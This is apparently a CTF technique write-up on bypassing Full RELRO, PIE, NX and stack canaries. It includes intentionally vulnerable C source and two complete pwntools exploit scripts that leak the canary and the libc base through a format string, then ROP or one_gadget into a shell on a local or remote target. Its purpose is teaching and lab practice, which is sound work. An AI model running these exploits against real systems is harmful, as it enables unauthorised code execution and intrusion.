---
title: "Full RELRO + PIE + NX + Canary - The Modern Bypass Playbook"
category: pwn
subcategory: mitigation-bypass
type: technique
tags: [full-relro, relro, pie, nx, aslr, canary, stack-canary, rop, ret2libc, got, plt, info-leak, libc-base, one-gadget, format-string, brute-force, checksec, pwntools, ropgadget, ropper]
difficulty: hard
summary: "All mitigations on. One order works: find the bug, get a leak, restore the canary, rebase PIE and libc, then ROP on the stack because the GOT is read-only."
when_to_use:
  - "checksec is all green: Full RELRO, Canary found, NX enabled, PIE enabled"
  - "You have a memory corruption bug but no idea which mitigation to attack first"
  - "Your GOT overwrite silently does nothing (Full RELRO made .got read-only)"
  - "You have a leak primitive and need to decide what to leak and in what order"
  - "You need a checklist to stop yourself burning hours on the wrong mitigation"
tools: [pwntools, checksec, ROPgadget, ropper, gdb, gef, pwndbg, one_gadget, patchelf, pwninit, ldd, readelf]
related: [mitigation-canary-bypass, mitigation-partial-overwrite-brute, mitigation-libc-identification, rop-fundamentals, rop-ret2libc, rop-one-gadget, rop-stack-pivot, rop-got-overwrite, rop-ret2csu, rop-ret2dlresolve, fmtstr-read-leak, fmtstr-arbitrary-write, stack-buffer-overflow-basics, pwntools-cheatsheet, exploit-template]
---

## TL;DR

Full RELRO + PIE + NX + canary is the default build of every modern distro package, and it is
beatable with one fixed recipe: **bug -> leak -> canary -> PIE base -> libc base -> ROP on the
stack**. Each mitigation kills exactly one *technique*, not the class of attack. The only one
that really changes your plan is Full RELRO, which removes the GOT as a write target and forces
you onto stack ROP, `one_gadget`, or a function-pointer/hook overwrite.

## Recognise it

```
$ checksec --file=./vuln
RELRO           STACK CANARY      NX            PIE
Full RELRO      Canary found      NX enabled    PIE enabled
```

- Your ret2win crashes with `*** stack smashing detected ***` -> canary.
- Hardcoded addresses work locally with ASLR off and never remotely -> PIE/ASLR.
- Shellcode on the stack SIGSEGVs at the first instruction -> NX.
- Your GOT overwrite "succeeds" but nothing changes -> Full RELRO made `.got` read-only
  (`readelf -l ./vuln | grep GNU_RELRO`; `.got.plt` is merged into `.got`).
- `readelf -d ./vuln | grep -E "BIND_NOW|FLAGS"` shows `BIND_NOW` -> everything was resolved at
  load time, the PLT is not lazily resolvable, so `ret2dlresolve` is dead too.

## Decision flow

```
1. What is the bug?
   overflow -> the canary is in the way        fmtstr -> you already have read AND write
   UAF/heap -> tcache/fastbin, same leak questions    OOB index -> relative write

2. Do I have ANY leak?
   NO  -> make one, cheapest first: fmtstr %p dump | uninitialised stack read | OOB
          read | 1/16 partial overwrite into a call site that prints | heap metadata
   YES -> go to 3.

3. Canary between me and the saved RIP?
   YES -> leak it (%N$p, off-by-one %s, byte-by-byte on a fork server) and write it
          back verbatim.                          [mitigation-canary-bypass]

4. PIE?
   YES -> leak ANY code pointer (return address into main, a vtable entry, a fn ptr),
          elf.address = leak - known_offset. The base must end in 000.

5. Need libc? (only if the binary has no win()/system)
   Leak a GOT entry or a saved libc return address, identify the build, then
   libc.address = leak - sym_offset.              [mitigation-libc-identification]

6. NX: no shellcode. Build a ROP chain.           [rop-fundamentals]

7. Full RELRO: no GOT writes. Pick a landing: stack ROP (default) | one_gadget |
   stack pivot into .bss | FILE vtable or other function pointer | __exit_funcs
```

### checksec to strategy

| checksec line | What it blocks | What you do instead |
|---|---|---|
| `NX enabled` | executing the stack/heap | ROP; `mprotect` gadget chain if you insist on shellcode |
| `NX disabled` | nothing | jump straight to shellcode (`shellcode-ret2shellcode`) |
| `Canary found` | overwriting saved RIP linearly | leak or brute the canary, or hit a pre-epilogue target |
| `Partial RELRO` | nothing meaningful | GOT overwrite is open (`rop-got-overwrite`), and so is `ret2dlresolve` |
| `Full RELRO` | writes to `.got`/`.got.plt`, lazy binding | stack ROP, `one_gadget`, hooks/vtables, stack pivot |
| `PIE enabled` | hardcoded binary addresses | leak a code pointer, rebase `elf`; or partial overwrite (1/16) |
| ASLR on (kernel) | hardcoded libc/stack/heap | leak libc; the low 12 bits of everything are still known |
| `FORTIFY` in `readelf -s` | naive `strcpy`/`sprintf` overflows | find a `read`/`memcpy` with an attacker length |
| Static + no PIE | ret2libc | huge gadget set in the binary itself (`rop-static-binary`) |

## Vulnerable source

```c
/* vuln.c - every mitigation on, and two bugs: a format string and an overflow */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vuln(void) {
    char buf[128];
    printf("leak> ");
    fflush(stdout);
    read(0, buf, 127);
    buf[127] = 0;
    printf(buf);                 /* bug 1: format string -> canary, PIE base, libc base */
    puts("");
    printf("pwn> ");
    fflush(stdout);
    read(0, buf, 0x200);         /* bug 2: linear overflow, canary must be preserved */
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    vuln();
    return 0;
}
```

```sh
# the modern default build: canary everywhere, PIE, NX, Full RELRO (relro + bind now)
gcc -fstack-protector-all -pie -fPIE -Wl,-z,relro,-z,now -z noexecstack -o vuln vuln.c

checksec --file=./vuln              # Full RELRO / Canary found / NX enabled / PIE enabled
readelf -d ./vuln | grep -E "BIND_NOW|FLAGS"
ldd ./vuln                          # which libc you are actually linking against
```

## Theory

### What each mitigation really costs you

- **NX** removes "jump to your shellcode", not code reuse. ROP answers it, and gadget supply is
  never the problem once libc is rebased.
- **Canary** removes "linear overflow to saved RIP without a secret": one extra 8-byte unknown.
  It does nothing against non-linear writes (OOB index, heap corruption, format-string `%n`).
- **PIE + ASLR** removes hardcoded addresses: one unknown per region (binary, libc, stack, heap).
  One leak per region is enough forever, because each region's internal layout is fixed.
- **Full RELRO** removes the GOT as a **write** target, not as a **read** target -- leaking
  `got['puts']` still works perfectly, which is why ret2libc is unaffected.

### Why leaks are the whole game

Three of the four mitigations are defeated by information, not by cleverness. A single
format-string `%p` dump usually hands you all three unknowns at once, because the stack of a
function called from `main` naturally contains:

- the **canary** (a qword ending in `00`, high entropy);
- a **binary** pointer (a return address into `main`) whose low 12 bits match an ELF offset;
- a **libc** pointer (`__libc_start_call_main+N`, the return address of `main`, plus `_IO_`
  pointers) whose low 12 bits match a libc offset;
- a **stack** pointer (a saved rbp, or a pointer into `buf` itself).

Identify each by its low 12 bits and by its top byte: `0x7f...` is libc/stack/mmap on x86-64,
`0x55...`/`0x56...` is a PIE binary.

### Full RELRO: where to land when the GOT is read-only

1. **Stack ROP** (the default). You already control the stack; build the chain there.
2. **`one_gadget`** -- one address, `execve("/bin/sh", NULL, NULL)`, if the constraints hold
   (`rop-one-gadget`). Perfect when you only control a single pointer.
3. **Stack pivot** into `.bss` when the overflow is too short for a full chain: `leave; ret` or
   `pop rsp; ret` after writing the chain elsewhere (`rop-stack-pivot`).
4. **Function pointers you can still write**: heap callbacks, C++ vtables, `FILE` vtables,
   `atexit`/`__exit_funcs` handlers, `tls_dtor_list` -- all writable, all untouched by RELRO.
5. **`__malloc_hook` / `__free_hook`** on glibc <= 2.33 only; removed in 2.34.

### Two shots, not one

The playbook needs the vulnerable function to run **twice**: once to leak, once to exploit. If
it runs once, use a one-pass chain -- `puts(got)` then return to `main`/`vuln` (`rop-ret2libc`),
or a format string that leaks and writes in the same payload (`fmtstr-advanced`).

## Attack

1. `checksec`, `readelf -d`, `ldd`, `file`. Write the mitigation set down before touching code.
2. Find the bug and the offsets (`cyclic`, `offset-finder`), noting the distance to the canary
   and to the saved RIP separately.
3. Dump the stack with `%p`s and classify every slot: canary / binary / libc / stack.
4. Fix the indices as constants. Compute `elf.address` and `libc.address`; both must end in
   `000`. If the libc build is unknown, fingerprint it (`mitigation-libc-identification`).
5. Build the chain against the **rebased** `ELF` objects so `rop.find_gadget` returns runtime
   addresses. Take gadgets from libc -- it always has `pop rdi ; ret`.
6. Payload = `pad + p64(canary) + p64(fake_rbp) + chain`, with a bare `ret` before `system` for
   `movaps` alignment.
7. Works locally, fails remotely? It is the libc version. Patch with `pwninit`/`patchelf` and
   re-test locally against the remote libc.

## Exploit

```python
#!/usr/bin/env python3
"""Full RELRO + PIE + NX + canary: leak everything with one format string, then ROP.

Stage 1 - one %p dump gives canary, PIE base and libc base.
Stage 2 - overflow with the canary restored, chain to system("/bin/sh") in libc.
Run `./exploit.py DUMP` first to print the stack and fix the three indices below.

Local:  ./exploit.py            Remote: ./exploit.py HOST PORT
Build:  gcc -fstack-protector-all -pie -fPIE -Wl,-z,relro,-z,now -z noexecstack -o vuln vuln.c
"""
import sys

from pwn import *

BINARY = "./vuln"
LIBC = "./libc.so.6"

OFFSET = 136          # buf -> canary (128 buf + 8 alignment); verify with cyclic
CANARY_IDX = 33       # %N$p of the canary
PIE_IDX = 35          # %N$p of a return address inside main
LIBC_IDX = 37         # %N$p of __libc_start_call_main's return address

MAIN_RET_OFF = 0x0     # (leaked_pie - this) = elf base; set from the DUMP run
LIBC_START_OFF = 0x0   # (leaked_libc - this) = libc base; see mitigation-libc-identification

context.binary = elf = ELF(BINARY, checksec=False)
context.arch = "amd64"
context.log_level = "info"


def start():
    if len(sys.argv) >= 3:
        return remote(sys.argv[1], int(sys.argv[2]))
    if args.GDB:
        return gdb.debug(BINARY, gdbscript="b *vuln+120\nc\n")
    return process(BINARY)


def load_libc(io):
    if os.path.exists(LIBC):
        return ELF(LIBC, checksec=False)
    if getattr(io, "libc", None) is not None:
        return io.libc
    log.failure("no libc - fingerprint it (mitigation-libc-identification)")
    sys.exit(1)


def dump_stack(io):
    """Print slots 1..40 so you can classify canary / binary / libc / stack by eye."""
    fmt = b"|".join(("%%%d$p" % i).encode() for i in range(1, 41))
    io.recvuntil(b"leak> ")
    io.send(fmt.ljust(127, b"\x00"))
    line = io.recvline().strip()
    for i, token in enumerate(line.split(b"|"), start=1):
        log.info("%%%d$p = %s", i, token.decode(errors="replace"))
    return line


def leak_all(io):
    """One format string, three unknowns. %p order is our own, so indices are stable."""
    fmt = ("%%%d$p|%%%d$p|%%%d$p" % (CANARY_IDX, PIE_IDX, LIBC_IDX)).encode()
    io.recvuntil(b"leak> ")
    io.send(fmt.ljust(127, b"\x00"))
    parts = io.recvline().strip().split(b"|")
    canary, pie_ptr, libc_ptr = (int(p, 16) for p in parts[:3])

    if canary & 0xFF:
        log.warning("canary %#x does not end in 00 - CANARY_IDX is wrong", canary)
    log.success("canary    = %#x", canary)
    log.success("pie  ptr  = %#x", pie_ptr)
    log.success("libc ptr  = %#x", libc_ptr)
    return canary, pie_ptr, libc_ptr


def rebase(elf_obj, leak, offset, name):
    base = leak - offset
    if base & 0xFFF:
        log.warning("%s base %#x is not page aligned - wrong offset or wrong slot", name, base)
    elf_obj.address = base
    log.success("%s base = %#x", name, base)
    return base


def build_chain(libc):
    """Full RELRO: no GOT writes. Plain stack ROP into system("/bin/sh")."""
    rop = ROP(libc)
    rop.raw(rop.find_gadget(["ret"]).address)          # movaps alignment
    rop.call(libc.symbols["system"], [next(libc.search(b"/bin/sh\x00"))])
    log.info("chain:\n%s", rop.dump())
    return rop.chain()


def main():
    io = start()
    libc = load_libc(io)

    if args.DUMP:
        dump_stack(io)
        io.close()
        return

    canary, pie_ptr, libc_ptr = leak_all(io)
    rebase(elf, pie_ptr, MAIN_RET_OFF, "elf")
    rebase(libc, libc_ptr, LIBC_START_OFF, "libc")

    payload = b"A" * OFFSET
    payload += p64(canary)                              # canary, byte for byte
    payload += p64(elf.bss() + 0x800)                   # saved rbp: writable
    payload += build_chain(libc)

    io.recvuntil(b"pwn> ")
    io.send(payload)
    io.sendline(b"id; cat flag.txt; cat /flag*")
    io.interactive()


if __name__ == "__main__":
    main()
```

### one_gadget fallback when the chain will not fit

```python
#!/usr/bin/env python3
"""Overflow reaches saved RIP + 8 bytes only: try each one_gadget until its constraints hold.

Local: ./onegadget.py    Remote: ./onegadget.py HOST PORT    (same build as exploit.py)
"""
import sys

from pwn import *

BINARY, OFFSET = "./vuln", 136
CANARY_IDX, LIBC_IDX, LIBC_START_OFF = 33, 37, 0x0
GADGETS = [0x50A37, 0xEBCF1, 0xEBCF5, 0xEBCF8]   # from `one_gadget ./libc.so.6`

context.binary = elf = ELF(BINARY, checksec=False)
context.arch = "amd64"
context.log_level = "error"


def attempt(gadget_off):
    io = remote(sys.argv[1], int(sys.argv[2])) if len(sys.argv) >= 3 else process(BINARY)
    try:
        io.recvuntil(b"leak> ")
        io.send(("%%%d$p|%%%d$p" % (CANARY_IDX, LIBC_IDX)).encode().ljust(127, b"\x00"))
        canary, libc_ptr = (int(v, 16) for v in io.recvline().strip().split(b"|")[:2])
        io.recvuntil(b"pwn> ")
        io.send(b"A" * OFFSET + p64(canary) + p64(0)
                + p64(libc_ptr - LIBC_START_OFF + gadget_off))
        io.sendline(b"echo PWNED")
        if b"PWNED" in io.recvrepeat(0.5):
            return io
    except (EOFError, ValueError):
        pass
    try:
        io.close()
    except EOFError:
        pass
    return None


def main():
    for off in GADGETS:
        log.warning("trying one_gadget %#x", off)
        io = attempt(off)
        if io is not None:
            io.sendline(b"cat flag.txt; cat /flag*")
            io.interactive()
            return
    log.warning("no gadget fits - pivot the stack and use a real chain instead")


if __name__ == "__main__":
    main()
```

## Variants & pitfalls

- **Leaking an unresolved GOT slot.** A slot only holds a libc address after that function has
  been called -- except under BIND_NOW, where everything is resolved at load time. One thing
  Full RELRO makes *easier*.
- **Base not page aligned.** `base & 0xfff != 0` means the slot index or the symbol offset is
  wrong. Fix it first; every later address derives from it. And never hardcode a base.
- **movaps SIGSEGV inside `do_system`.** Add one bare `ret` gadget before `system`. The single
  most common "everything is right but no shell" cause.
- **Only one shot at the bug.** Chain `puts(got)` + return to `main` instead of a two-phase
  script (`rop-ret2libc`), or leak and write in one format string (`fmtstr-advanced`).
- **No `pop rdi` in a PIE binary.** Take gadgets from libc once rebased: `ROP(libc)` after
  setting `libc.address` returns runtime addresses. `__free_hook` is gone in glibc 2.34+.
- **Seccomp on.** `system`/`execve` may be blocked entirely; check with `seccomp-tools dump
  ./vuln` and switch to an open/read/write chain (`shellcode-seccomp-orw`).
- **No leak at all and a fork server.** Fall back to brute force: the canary byte by byte and the
  saved RIP a nibble at a time (`mitigation-partial-overwrite-brute`).
- **Static binary.** No libc to leak and no GOT games, but an enormous gadget set and direct
  syscall gadgets (`rop-static-binary`, `rop-srop`).

## Tools

| Tool | Use |
|---|---|
| `checksec --file=./vuln` | The mitigation set that drives the entire plan |
| `readelf -d ./vuln \| grep BIND_NOW` | Confirms Full RELRO, and that `ret2dlresolve` is dead |
| `ROPgadget --binary ./libc.so.6 --only "pop\|ret"` | Argument gadgets once libc is rebased |
| `one_gadget ./libc.so.6` | Single-address `execve` for short overflows |
| `gdb` + `pwndbg`/`gef`: `vmmap`, `canary`, `got`, `telescope $rsp` | Classify every stack slot fast |
| `pwntools` `ROP.dump()`, `flat`, `fit` | Build and eyeball the chain before sending |
| `pwninit` / `patchelf` | Run locally against the exact remote libc |
| `seccomp-tools dump ./vuln` | Check whether `execve` is even allowed |
